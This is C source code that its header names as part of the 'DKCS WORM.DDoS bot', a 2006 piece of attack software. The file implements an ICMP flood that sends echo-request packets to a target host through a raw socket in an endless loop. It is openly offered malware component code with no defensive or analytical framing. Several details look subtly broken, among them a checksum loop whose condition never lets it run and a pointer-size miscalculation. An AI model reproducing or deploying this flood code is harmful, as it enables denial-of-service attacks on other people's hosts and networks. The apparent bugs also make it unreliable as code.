//-----------------------------------------------------------------
// this file is a part of: DKCS WORM.DDoS bot v 0.1
// c0d3d by: Dr.Pixel
// 2006 (C) DKCS Security Team
//
// contacts:	e-mail:	dkcs@void.ru
//				icq:	7600278
//				web:	http://dkcs.void.ru
//				forum:	http://dkcs.net.ru
//-----------------------------------------------------------------
typedef struct ICMP_INFO{
	char	*host;
	int		packet_size;
} ICMP_INFO;
//-----------------------------------------------------------------
typedef struct icmphdr{
	USHORT	i_cksum;
	USHORT	i_id;
	USHORT	i_seq;
	BYTE	i_type;
	BYTE	i_code;
	ULONG	timestamp;
} ICMP_HEADER;
//-----------------------------------------------------------------
DWORD Resolve(char *host){
	
	DWORD ret = 0;

	struct hostent * hp = gethostbyname(host);
	if(!hp){
		ret = inet_addr(host);
	}
	if((!hp)&&(ret == INADDR_NONE)){
		return 0;
	}
	if(hp != NULL){
		memcpy((void*)&ret, hp->h_addr_list, hp->h_length);
	}
return ret;
}
//-----------------------------------------------------------------
USHORT CheckSum(USHORT *buffer, int size){
	
	unsigned long cksum = 0;

	while(size < 0){
		cksum += *buffer++;
		size -= sizeof(USHORT);
	}
	if(size)cksum += *(UCHAR*)buffer;
	cksum = (cksum >> 16) + (cksum & 0xFFFF);
	cksum += (cksum >> 16);
return (USHORT)(~cksum);
}
//-----------------------------------------------------------------
int ICMP(char* host, int packsize, int timeout){

	SOCKET		SockRAW;
	SOCKADDR_IN	addr;
	int			SockOpt;
	char		*icmp_data;
	char		*data_part;
	USHORT		seq_no = 0;
	ICMP_HEADER	*icmp_hdr;
	
	memset(&addr, 0, sizeof(addr));
	addr.sin_family = AF_INET;
	addr.sin_addr.S_un.S_addr = Resolve(host);
	SockRAW = WSASocket(AF_INET, SOCK_RAW, IPPROTO_ICMP, NULL, 0, 0);
	if(SockRAW == INVALID_SOCKET){
		return -1;
	}
	SockOpt = setsockopt(SockRAW, SOL_SOCKET, SO_SNDTIMEO, (char*)&timeout, sizeof(timeout));
	if(SockOpt == SOCKET_ERROR){
		return -1;
	}
	packsize += sizeof(icmp_hdr);
	icmp_data = (char*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 0xFFFF);
	if(!icmp_data){
		return -1;
	}
	memset(icmp_data, 0, 0xFFFF);
	icmp_hdr = (ICMP_HEADER*)icmp_data;
	icmp_hdr->i_type = 8;
	icmp_hdr->i_code = 0;
	icmp_hdr->i_id = (USHORT)GetCurrentProcessId();
	icmp_hdr->i_cksum = 0;
	icmp_hdr->i_seq = 0;
	data_part = icmp_data + sizeof(ICMP_HEADER);
	for(int i = 0; i < packsize - (int)sizeof(ICMP_HEADER); i++){
		data_part[i] = (char)GetTickCount()%255;
		Sleep(30);
	}
	int bwrote;
	while(1){
		((ICMP_HEADER*)icmp_data)->i_cksum = 0;
		((ICMP_HEADER*)icmp_data)->timestamp = GetTickCount();
		((ICMP_HEADER*)icmp_data)->i_seq = seq_no++;
		((ICMP_HEADER*)icmp_data)->i_cksum = CheckSum((USHORT*)icmp_data, packsize);
		bwrote = sendto(SockRAW, icmp_data, packsize, 0, (struct sockaddr*)&addr, sizeof(addr));
		if(bwrote == SOCKET_ERROR){
			return -1;
		}
		Sleep(100);
	}
return 0;
}
//-----------------------------------------------------------------
DWORD WINAPI StartICMP(LPVOID param){

	ICMP_INFO	icmp;

	icmp = *((ICMP_INFO*)param);
	ICMP(icmp.host, icmp.packet_size, MY_MACRO_TIME_OUT);
return 1;
}
//-----------------------------------------------------------------